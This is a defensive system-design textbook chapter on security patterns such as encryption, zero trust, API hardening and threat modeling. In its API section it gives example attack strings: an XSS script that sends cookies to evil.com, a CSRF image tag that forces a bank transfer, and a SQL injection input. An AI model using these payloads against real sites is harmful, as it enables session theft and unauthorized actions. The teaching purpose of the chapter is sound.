# Chapter 20: Security Patterns in System Design

## Introduction

Security is not a module you bolt on at the end — it is a **cross-cutting concern**
that must be woven into every layer of your system architecture. A single vulnerability
in any layer — network, application, data, or operational — can compromise the
entire system. In high-level design interviews and real-world engineering, demonstrating
security awareness is what separates adequate designs from production-grade ones.

This chapter covers encryption strategies, network security, API hardening, zero trust
architecture, data privacy, secrets management, and threat modeling — everything you
need to design systems that are secure by default.

---

## 20.1 Security as a Cross-Cutting Concern

Security is not isolated to one component. It spans every architectural layer:

```
+------------------------------------------------------------------+
|                        CLIENT LAYER                               |
|  Input validation | HTTPS | CSRF tokens | Content Security Policy|
+------------------------------------------------------------------+
|                        API GATEWAY LAYER                          |
|  Rate limiting | Authentication | WAF | IP whitelisting           |
+------------------------------------------------------------------+
|                      APPLICATION LAYER                            |
|  Authorization | Input sanitization | Business logic validation   |
+------------------------------------------------------------------+
|                       SERVICE LAYER                               |
|  mTLS | Service mesh policies | Least privilege | Secret mgmt    |
+------------------------------------------------------------------+
|                        DATA LAYER                                 |
|  Encryption at rest | Access controls | Audit logging | Backups  |
+------------------------------------------------------------------+
|                      NETWORK LAYER                                |
|  VPC | Security groups | NACLs | Private subnets | DDoS shield   |
+------------------------------------------------------------------+
|                     OPERATIONAL LAYER                             |
|  Monitoring | Alerting | Incident response | Penetration testing  |
+------------------------------------------------------------------+
```

**Principle of Defense in Depth:** No single security control should be your only
line of defense. Layer multiple controls so that if one fails, others still protect
the system.

---

## 20.2 Encryption

### 20.2.1 Encryption at Rest

Protects data stored on disk — databases, file systems, object storage, backups.

```
+------------------+        +-------------------+        +------------------+
| Application      | -----> | Encryption Engine | -----> | Encrypted Storage|
| (plaintext data) |        | (AES-256-GCM)    |        | (ciphertext)     |
+------------------+        +-------------------+        +------------------+
                                    |
                             +------+------+
                             | Key Manager |
                             | (KMS / HSM) |
                             +-------------+
```

**Common approaches:**

| Method                       | Description                                  | Example                    |
|-----------------------------|----------------------------------------------|----------------------------|
| **Full-disk encryption**    | Entire disk encrypted at OS/hardware level   | LUKS, BitLocker, AWS EBS   |
| **Database encryption (TDE)**| Database engine encrypts data files          | PostgreSQL TDE, SQL Server |
| **Application-level**       | App encrypts data before writing to DB       | Custom AES encryption      |
| **Object storage**          | Cloud-managed encryption of stored objects   | S3 SSE-S3, SSE-KMS        |

**Key Management is everything.** Encryption is only as strong as how you manage keys.

| Key Management Option       | Description                                     |
|----------------------------|-------------------------------------------------|
| **AWS KMS**                | Managed service, automatic rotation, audit trail|
| **Azure Key Vault**        | Microsoft equivalent with HSM backing           |
| **GCP Cloud KMS**          | Google Cloud key management with IAM integration|
| **HashiCorp Vault**        | Open-source/enterprise, multi-cloud, dynamic    |
| **HSM (Hardware Security Module)** | Physical device, FIPS 140-2 compliant   |

**Envelope encryption pattern:** Used by AWS and others for performance:

```
1. Generate a Data Encryption Key (DEK)
2. Encrypt data with DEK (fast, symmetric AES)
3. Encrypt DEK with Master Key (KEK) stored in KMS
4. Store encrypted DEK alongside encrypted data
5. To decrypt: call KMS to decrypt DEK, then decrypt data

+----------+         +----------+         +----------+
| Data     |--AES--->| Encrypted|         | Encrypted|
| (plain)  |  (DEK)  | Data     |         | DEK      |
+----------+         +----------+         +----------+
                                               ^
                                               | Encrypted by Master Key (in KMS)
```

### 20.2.2 Encryption in Transit

Protects data as it moves between systems over the network.

**TLS 1.3 (Transport Layer Security):**

```
+--------+                              +---------+
| Client |                              | Server  |
+--------+                              +---------+
    |                                        |
    |--- ClientHello (supported ciphers) --->|
    |                                        |
    |<-- ServerHello + Certificate +         |
    |    Key Share -------------------------|
    |                                        |
    |--- Key Share + Finished -------------->|
    |                                        |
    |<-- Finished (1-RTT handshake!) --------|
    |                                        |
    |<=== Encrypted Application Data =======>|
```

**TLS 1.3 improvements over TLS 1.2:**
- 1-RTT handshake (down from 2-RTT) — faster connections
- Removed insecure cipher suites (RC4, DES, 3DES, static RSA)
- Forward secrecy is mandatory (ephemeral key exchange only)
- 0-RTT resumption for repeat connections (with replay protection)

**mTLS (Mutual TLS) for service-to-service communication:**

In standard TLS, only the server proves its identity. In mTLS, **both parties**
present certificates:

```
+-----------+                         +-----------+
| Service A |                         | Service B |
+-----------+                         +-----------+
     |                                      |
     |--- ClientHello + Client Cert ------->|
     |<-- ServerHello + Server Cert --------|
     |                                      |
     | Both verify each other's certificates|
     | against a trusted Certificate Authority
     |                                      |
     |<=== Encrypted + Mutually Trusted ===>|
```

**Use cases:** Microservice communication, zero-trust environments, Kubernetes
service mesh (Istio, Linkerd).

### 20.2.3 End-to-End Encryption (E2EE)

Data is encrypted on the sender's device and only decrypted on the recipient's
device. **No intermediary (not even the service provider) can read the data.**

```
+--------+         +---------+         +----------+
| Alice  |         | Server  |         | Bob      |
| Phone  |         | (Blind) |         | Phone    |
+--------+         +---------+         +----------+
    |                    |                    |
    | Encrypt with       |                    |
    | Bob's public key   |                    |
    |--- [ciphertext] -->|--- [ciphertext] -->|
    |                    |                    | Decrypt with
    |              Cannot decrypt             | Bob's private key
    |                    |                    |
```

**Signal Protocol (used by Signal, WhatsApp, Google Messages RCS):**
- Double Ratchet Algorithm for forward secrecy + future secrecy
- Each message uses a unique key
- Compromise of one key does not expose past or future messages
- Pre-keys enable asynchronous encrypted messaging

---

## 20.3 Network Security

### 20.3.1 Firewalls, Security Groups, NACLs

```
Internet
    |
    v
+------------------+
| Firewall / WAF   |  <-- Layer 7 filtering (HTTP rules)
+------------------+
    |
    v
+------------------+
| Load Balancer    |
+------------------+
    |
    v
+--------------------------------------------------+
| VPC (Virtual Private Cloud)                       |
|                                                   |
|  +------- Public Subnet --------+                |
|  | NACLs (Stateless, subnet)    |                |
|  |   +----------------------+   |                |
|  |   | Security Group       |   |                |
|  |   | (Stateful, instance) |   |                |
|  |   |  +----------------+  |   |                |
|  |   |  | Web Servers    |  |   |                |
|  |   |  +----------------+  |   |                |
|  |   +----------------------+   |                |
|  +------------------------------+                |
|                                                   |
|  +------- Private Subnet -------+                |
|  |   +----------------------+   |                |
|  |   | App Servers / DB     |   |                |
|  |   | (no internet access) |   |                |
|  |   +----------------------+   |                |
|  +------------------------------+                |
+--------------------------------------------------+
```

| Control          | Level         | Stateful? | Scope           | Rules              |
|-----------------|---------------|-----------|-----------------|---------------------|
| **Firewall**    | Network edge  | Yes       | Entire network  | IP, port, protocol  |
| **Security Group** | Instance   | Yes       | Per instance    | Allow only (no deny)|
| **NACL**        | Subnet        | No        | Per subnet      | Allow + Deny        |

### 20.3.2 VPC, Private Subnets, Bastion Hosts

**Best practice:** Place databases and application servers in **private subnets**
with no direct internet access. Use a **bastion host** (jump box) for administrative
access.

```
Internet
    |
    v
+------- Public Subnet --------+
|  +--------+    +-----------+  |
|  | ALB    |    | Bastion   |  |
|  | (443)  |    | Host (22) |  |
|  +--------+    +-----------+  |
+-------------------------------+
       |               |
       v               v (SSH tunnel)
+------- Private Subnet --------+
|  +----------+   +-----------+ |
|  | App      |   | Database  | |
|  | Servers  |   | (RDS)     | |
|  +----------+   +-----------+ |
+-------------------------------+
```

**Modern alternative to bastion hosts:** AWS Systems Manager Session Manager or
AWS SSM Fleet Manager — no open SSH ports needed.

### 20.3.3 WAF (Web Application Firewall)

A WAF inspects HTTP/HTTPS traffic and blocks malicious requests based on rules.

**OWASP Top 10 protections:**

| OWASP Threat                    | WAF Protection                          |
|--------------------------------|------------------------------------------|
| SQL Injection                  | Pattern matching, parameterized queries  |
| Cross-Site Scripting (XSS)     | Input filtering, content encoding        |
| Broken Authentication          | Rate limiting, bot detection              |
| Security Misconfiguration      | Header validation, default blocking      |
| Server-Side Request Forgery    | URL validation, IP restrictions           |

**WAF providers:** AWS WAF, Cloudflare WAF, Akamai, Imperva.

### 20.3.4 DDoS Protection

**DDoS (Distributed Denial of Service)** attacks flood systems with traffic to
make them unavailable.

```
Mitigation Architecture:

                 Malicious Traffic
                 |||||||||||||||
                 vvvvvvvvvvvvvvv
            +--------------------+
            | CDN / DDoS Shield  |  <-- Absorb volumetric attacks
            | (Cloudflare, AWS   |      at network edge
            |  Shield Advanced)  |
            +--------------------+
                      |
                      v (clean traffic)
            +--------------------+
            | WAF                |  <-- Block application-layer attacks
            | (Layer 7 rules)   |
            +--------------------+
                      |
                      v
            +--------------------+
            | Rate Limiter       |  <-- Per-user/IP request throttling
            | (API Gateway)      |
            +--------------------+
                      |
                      v
            +--------------------+
            | Application        |  <-- Receives only legitimate traffic
            +--------------------+
```

**DDoS attack types and mitigations:**

| Attack Type        | Layer  | Example              | Mitigation                      |
|-------------------|--------|----------------------|---------------------------------|
| **Volumetric**    | L3/L4  | UDP flood, amplify   | CDN, anycast, scrubbing center  |
| **Protocol**      | L3/L4  | SYN flood, Smurf     | SYN cookies, connection limits  |
| **Application**   | L7     | HTTP flood, Slowloris| WAF, rate limiting, auto-scaling|

---

## 20.4 API Security

### 20.4.1 Input Validation and Sanitization

**Never trust client input.** Every piece of data from the client is potentially malicious.

```
Client Input --> [Validation Layer] --> [Sanitization] --> Application Logic
                       |                      |
                 Reject invalid          Strip/escape
                 (400 Bad Request)       dangerous chars
```

**Validation rules:**
- Enforce type, length, format, and range constraints
- Use allowlists (whitelist) over denylists (blacklist)
- Validate on the server side (client-side validation is a UX aid, not security)
- Use schema validation libraries (Joi, Zod, JSON Schema, Pydantic)

### 20.4.2 SQL Injection Prevention

SQL injection occurs when user input is concatenated directly into SQL queries.

```
VULNERABLE (string concatenation):
  query = "SELECT * FROM users WHERE id = '" + user_input + "'"

  Input: "1' OR '1'='1"
  Result: SELECT * FROM users WHERE id = '1' OR '1'='1'
  --> Returns ALL users!

SAFE (parameterized query):
  query = "SELECT * FROM users WHERE id = ?"
  params = [user_input]
  --> Input is treated as data, never as SQL code
```

**Prevention strategies:**
1. **Always** use parameterized queries / prepared statements
2. Use ORMs (they parameterize by default)
3. Apply principle of least privilege to database accounts
4. Input validation as a defense-in-depth layer

### 20.4.3 XSS (Cross-Site Scripting) Prevention

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

```
Stored XSS Example:
  Attacker posts comment: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
  --> Stored in DB, rendered to all users viewing the page
  --> Victims' cookies are sent to the attacker's server
```

**Prevention:**
1. **Output encoding:** HTML-encode all user-generated content before rendering
2. **Content Security Policy (CSP):** HTTP header restricting script sources
   `Content-Security-Policy: script-src 'self' https://trusted-cdn.com`
3. **HttpOnly cookies:** Prevents JavaScript from accessing session cookies
4. **DOM sanitization libraries:** DOMPurify, sanitize-html
5. **Avoid `innerHTML`** — use `textContent` or safe frameworks (React auto-escapes)

### 20.4.4 CSRF (Cross-Site Request Forgery)

CSRF tricks a user's browser into making unwanted requests to a site where they
are authenticated.

```
Attack Flow:
1. User is logged into bank.com (has session cookie)
2. User visits evil.com
3. evil.com contains: <img src="https://bank.com/transfer?to=attacker&amount=10000">
4. Browser automatically sends bank.com cookies with the request
5. Bank processes the transfer (thinks it's the legitimate user)
```

**Prevention:**
1. **CSRF tokens:** Server generates a unique, unpredictable token per session/request.
   Included in forms as a hidden field. Server validates the token on submission.
2. **SameSite cookie attribute:** `SameSite=Strict` or `SameSite=Lax` prevents
   cookies from being sent with cross-site requests
3. **Check `Origin` / `Referer` headers** for critical operations
4. **Custom request headers:** APIs requiring `X-Requested-With` header (not
   sent by simple cross-origin requests)

### 20.4.5 CORS (Cross-Origin Resource Sharing)

CORS controls which origins can make requests to your API.

```
Browser at https://myapp.com makes request to https://api.example.com

Preflight Request (OPTIONS):
  Origin: https://myapp.com
  Access-Control-Request-Method: POST
  Access-Control-Request-Headers: Content-Type, Authorization

Server Response:
  Access-Control-Allow-Origin: https://myapp.com
  Access-Control-Allow-Methods: GET, POST, PUT
  Access-Control-Allow-Headers: Content-Type, Authorization
  Access-Control-Max-Age: 86400
```

**CORS rules:**
- **Never** set `Access-Control-Allow-Origin: *` for authenticated APIs
- Allowlist specific trusted origins
- Be explicit about allowed methods and headers
- Set `Access-Control-Allow-Credentials: true` only when needed (and never with `*` origin)

---

## 20.5 Zero Trust Architecture

**Core principle: "Never trust, always verify."**

Traditional perimeter security (castle-and-moat) assumes everything inside the
network is trusted. Zero Trust assumes **no implicit trust** for any user, device,
or service — regardless of network location.

```
Traditional (Castle-and-Moat):            Zero Trust:
+---------------------------+             +---------------------------+
|     TRUSTED NETWORK       |             | Every request verified:   |
|  +-----+  +-----+        |             |  +-----+  +-----+        |
|  |Svc A|--|Svc B| (free)  |             |  |Svc A|~~|Svc B| (mTLS) |
|  +-----+  +-----+        |             |  +-----+  +-----+        |
|       \    /              |             |       \    /              |
|      +------+             |             |      +------+            |
|      |Svc C |             |             |      |Svc C | (verified) |
|      +------+             |             |      +------+            |
+---------------------------+             +---------------------------+
  Firewall guards perimeter                 Every hop is authenticated
```

### Zero Trust Pillars

**1. Microsegmentation:**
- Divide the network into small, isolated segments
- Each service/workload has its own security boundary
- Lateral movement by attackers is severely limited

**2. Continuous Verification:**
- Authenticate and authorize every request, not just at the perimeter
- Validate identity, device health, location, and behavior patterns
- Re-evaluate trust continuously (not just at login)

**3. Least Privilege Access:**
- Grant only the minimum permissions needed for each task
- Just-in-time (JIT) access: temporary elevated privileges that auto-expire
- Regular access reviews and certification campaigns

**Implementation technologies:**
- Service mesh (Istio, Linkerd) for mTLS and policy enforcement
- Identity-aware proxies (Google BeyondCorp, Cloudflare Access)
- Software-defined perimeter (SDP)
- Endpoint detection and response (EDR)

---

## 20.6 Data Privacy

### 20.6.1 PII Handling

**Personally Identifiable Information (PII)** includes names, emails, SSNs, phone
numbers, addresses, and any data that can identify an individual.

```
Data Classification:

+---------------+---------------------+---------------------------+
| Classification| Examples            | Handling                  |
+---------------+---------------------+---------------------------+
| Public        | Product names       | No restrictions           |
| Internal      | Employee IDs        | Access controls           |
| Confidential  | Email addresses     | Encryption + access ctrl  |
| Restricted    | SSN, health records | Encryption + audit + mask |
+---------------+---------------------+---------------------------+
```

**Data Masking and Tokenization:**

```
Original:    John Smith, SSN: 123-45-6789, Card: 4532-1234-5678-9012

Masked:      John S***h, SSN: ***-**-6789, Card: ****-****-****-9012
             (partial data visible for verification)

Tokenized:   tok_a1b2c3, SSN: tok_x7y8z9, Card: tok_p4q5r6
             (random tokens mapped in a secure vault)
```

| Technique       | Reversible? | Use Case                          |
|----------------|-------------|-----------------------------------|
| **Masking**    | No          | Display, logs, test environments  |
| **Tokenization**| Yes (via vault) | Payment processing (PCI DSS) |
| **Encryption** | Yes (via key)| Storage and transmission          |
| **Hashing**    | No          | Password storage, de-identification|
| **Anonymization**| No        | Analytics, data sharing           |

### 20.6.2 Compliance: GDPR and CCPA

| Requirement                | GDPR (EU)                    | CCPA (California)            |
|---------------------------|------------------------------|-------------------------------|
| **Scope**                 | EU residents' data           | California residents' data    |
| **Right to access**       | Yes                          | Yes                           |
| **Right to delete**       | Yes ("Right to be forgotten")| Yes                           |
| **Data portability**      | Yes                          | Yes                           |
| **Consent required**      | Explicit opt-in              | Opt-out model                 |
| **Breach notification**   | 72 hours                     | "Without unreasonable delay"  |
| **Penalties**             | Up to 4% global revenue      | $2,500-$7,500 per violation   |

**System design implications:**
- Build data deletion pipelines (cascade deletes across all systems)
- Implement data export APIs
- Maintain consent records
- Design for data minimization (collect only what you need)
- Implement audit trails for all PII access

### 20.6.3 Data Retention Policies

```
Data Lifecycle:

Collection --> Processing --> Storage --> Archival --> Deletion
                                |
                         [Retention Policy]
                         - Active: 1 year
                         - Archive: 5 years (cold storage)
                         - Delete: after 7 years total
                         - Legal hold: indefinite (if under litigation)
```

---

## 20.7 Secrets Management

### The Cardinal Rule: Never Hardcode Secrets

```
BAD (hardcoded):
  db_password = "super_secret_123"           # In source code
  API_KEY=sk_live_abc123                     # In .env committed to git

GOOD (runtime injection):
  db_password = vault.read("db/prod/pass")   # From secret manager
  API_KEY = os.environ["API_KEY"]            # Injected at deployment
```

### Secret Management Architecture

```
+---------------------+
| CI/CD Pipeline      |
+---------------------+
         |
         | Fetch secrets at deploy time
         v
+---------------------+        +---------------------+
| Secret Manager      | <----> | Encryption Backend  |
| (Vault / AWS SM)    |        | (KMS / HSM)         |
+---------------------+        +---------------------+
         |
         | Inject into app (env vars, mounted files)
         v
+---------------------+
| Application Runtime |
| (no secrets in code |
|  or config files)   |
+---------------------+
```

### Secret Rotation

Regularly changing secrets limits the blast radius of a compromise.

```
Automated Rotation Flow:

1. Rotation scheduler triggers (e.g., every 30 days)
2. Secret Manager generates new credentials
3. New credentials are set in the target system (e.g., database)
4. Applications fetch the new credentials on next request
5. Old credentials are deprecated after grace period
6. Old credentials are revoked

Timeline:
|------- Active: New Secret -------|
        |-- Grace Period --|
                           |-- Revoked: Old Secret --|
```

**Tools for rotation:**
- AWS Secrets Manager (built-in rotation with Lambda)
- HashiCorp Vault (dynamic secrets — credentials generated on-demand, auto-expire)
- CyberArk (enterprise PAM)

---

## 20.8 Security in Microservices

### Service Mesh (Istio)

A service mesh provides a dedicated infrastructure layer for service-to-service
communication with built-in security features.

```
+------------------------------------------------------+
|                    Control Plane                      |
|  (Istio Pilot, Citadel, Policy Engine)               |
+------------------------------------------------------+
         |              |              |
    Certificate    Policy Rules   Config Updates
         |              |              |
         v              v              v
+----------------+ +----------------+ +----------------+
| Service A      | | Service B      | | Service C      |
| +------------+ | | +------------+ | | +------------+ |
| | App        | | | | App        | | | | App        | |
| +------------+ | | +------------+ | | +------------+ |
| | Sidecar    | | | | Sidecar    | | | | Sidecar    | |
| | Proxy      |<-->| | Proxy      |<-->| | Proxy      | |
| | (Envoy)    | | | | (Envoy)    | | | | (Envoy)    | |
| +------------+ | | +------------+ | | +------------+ |
+----------------+ +----------------+ +----------------+
     mTLS              mTLS              mTLS
```

**Security features of a service mesh:**
- **Automatic mTLS:** All inter-service traffic is encrypted and mutually authenticated
- **Authorization policies:** Define which services can communicate
- **Certificate management:** Automatic cert rotation via built-in CA
- **Traffic policies:** Rate limiting, circuit breaking, retries
- **Observability:** Distributed tracing, metrics, access logs

### Policy Enforcement Example (Istio)

```yaml
# Only allow Service A to call Service B's /api/orders endpoint
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: allow-service-a-orders
spec:
  selector:
    matchLabels:
      app: service-b
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/default/sa/service-a"]
    to:
    - operation:
        methods: ["GET"]
        paths: ["/api/orders*"]
```

---

## 20.9 Threat Modeling — STRIDE

Threat modeling is the process of systematically identifying potential threats to
your system. **STRIDE** is a widely used framework developed at Microsoft.

| Threat                         | Description                                    | Example                                   | Mitigation                          |
|-------------------------------|------------------------------------------------|-------------------------------------------|-------------------------------------|
| **S**poofing                  | Pretending to be someone else                  | Stolen credentials, IP spoofing           | Strong authentication, MFA          |
| **T**ampering                 | Modifying data or code                         | Man-in-the-middle, SQL injection          | Integrity checks, signatures, TLS   |
| **R**epudiation               | Denying an action was performed                | User claims they didn't make a purchase   | Audit logs, digital signatures      |
| **I**nformation Disclosure    | Exposing data to unauthorized parties          | Data breach, error messages leaking info  | Encryption, access controls         |
| **D**enial of Service         | Making the system unavailable                  | DDoS, resource exhaustion                 | Rate limiting, scaling, CDN         |
| **E**levation of Privilege    | Gaining unauthorized access to higher privileges| Exploiting admin endpoints, IDOR         | Least privilege, input validation   |

### Threat Modeling Process

```
1. IDENTIFY ASSETS          2. DIAGRAM SYSTEM           3. IDENTIFY THREATS
   What needs protection?      Data flow diagrams           Apply STRIDE to
   - User data                 Trust boundaries             each component
   - API keys                  Entry points                 and data flow
   - Business logic

4. ASSESS RISK              5. MITIGATE                 6. VALIDATE
   Likelihood x Impact         Design countermeasures       Penetration testing
   Prioritize threats          Implement controls           Security reviews
                               Update architecture          Ongoing monitoring
```

---

## 20.10 Security Audit Logging

Comprehensive audit logs are essential for security monitoring, incident response,
compliance, and forensics.

### What to Log

```
+-----------------+----------------------------------------------+
| Category        | Events to Log                                |
+-----------------+----------------------------------------------+
| Authentication  | Login success/failure, MFA events, logout    |
|                 | Password changes, account lockouts           |
+-----------------+----------------------------------------------+
| Authorization   | Access granted/denied, privilege changes      |
|                 | Role assignments, permission modifications    |
+-----------------+----------------------------------------------+
| Data Access     | Read/write of sensitive data, exports         |
|                 | Bulk queries, PII access                     |
+-----------------+----------------------------------------------+
| Admin Actions   | Configuration changes, user management        |
|                 | Deployments, secret rotations                |
+-----------------+----------------------------------------------+
| Security Events | WAF blocks, rate limit triggers               |
|                 | Certificate errors, anomalous behavior        |
+-----------------+----------------------------------------------+
```

### What NOT to Log

- Passwords or credentials (even hashed)
- Full credit card numbers or SSNs
- Session tokens or API keys
- Encryption keys or secrets

### Audit Log Architecture

```
+------------+     +----------+     +---------------+     +----------------+
| Services   |---->| Log      |---->| Immutable Log |---->| SIEM / Analysis|
| (all apps) |     | Shipper  |     | Store         |     | (Splunk, ELK,  |
+------------+     | (Fluentd)|     | (S3, append-  |     |  Datadog)      |
                   +----------+     |  only DB)     |     +----------------+
                                    +---------------+           |
                                                          Alerts & Dashboards
                                                          Anomaly Detection
                                                          Incident Response
```

**Best practices:**
- Logs must be **immutable** (append-only storage, WORM — Write Once Read Many)
- Include timestamp, actor, action, resource, result, source IP, and request ID
- Centralize logs from all services
- Set up real-time alerting on critical security events
- Retain logs per compliance requirements (typically 1-7 years)
- Protect log integrity with checksums or digital signatures

---

## 20.11 Security Trade-Off Summary

| Security Measure             | Benefit                      | Cost / Trade-off                    |
|-----------------------------|------------------------------|-------------------------------------|
| Encryption at rest          | Data protected if storage breached | CPU overhead, key management   |
| mTLS everywhere             | All traffic authenticated + encrypted | Cert management complexity, latency |
| WAF                         | Block common attacks         | False positives, tuning effort      |
| Zero Trust                  | No implicit trust            | Higher complexity, more latency     |
| Input validation            | Prevent injection attacks    | Development effort                  |
| Audit logging               | Forensics + compliance       | Storage costs, PII in logs risk     |
| Secret rotation             | Limits breach impact         | Operational complexity              |
| Rate limiting               | DDoS + abuse protection      | May block legitimate burst traffic  |
| Data masking                | Privacy protection           | Reduced data utility for debugging  |
| Multi-factor authentication | Stronger identity assurance  | User friction, support overhead     |

---

## 20.12 Key Takeaways

1. **Security is defense in depth.** No single control is sufficient. Layer security
   at every level — network, transport, application, and data.

2. **Encrypt everything.** Data at rest (AES-256), data in transit (TLS 1.3), and
   consider end-to-end encryption for the most sensitive data.

3. **Never trust user input.** Validate and sanitize all input server-side. Use
   parameterized queries, output encoding, and CSRF tokens.

4. **Adopt Zero Trust.** Assume breach. Verify every request regardless of source.
   Use mTLS, microsegmentation, and least-privilege access.

5. **Protect secrets rigorously.** Use secret managers (Vault, AWS Secrets Manager),
   never hardcode credentials, and implement automated rotation.

6. **Privacy is a design constraint.** Build GDPR/CCPA compliance into your
   architecture from day one — data minimization, deletion pipelines, consent
   management, and audit trails.

7. **Use a service mesh** in microservices architectures for automatic mTLS,
   policy enforcement, and observability.

8. **Model your threats.** Use STRIDE or similar frameworks during design to
   systematically identify and mitigate threats before they become vulnerabilities.

9. **Log everything (securely).** Immutable, centralized audit logs are critical
   for incident response, compliance, and forensic analysis. Never log secrets.

10. **Security has costs — but breaches cost more.** Every security measure has
    a trade-off in complexity, performance, or user experience. Make informed
    decisions, but always err on the side of security for sensitive systems.

---

*Previous chapter: [Chapter 19 - Authentication and Authorization](19-auth.md)*
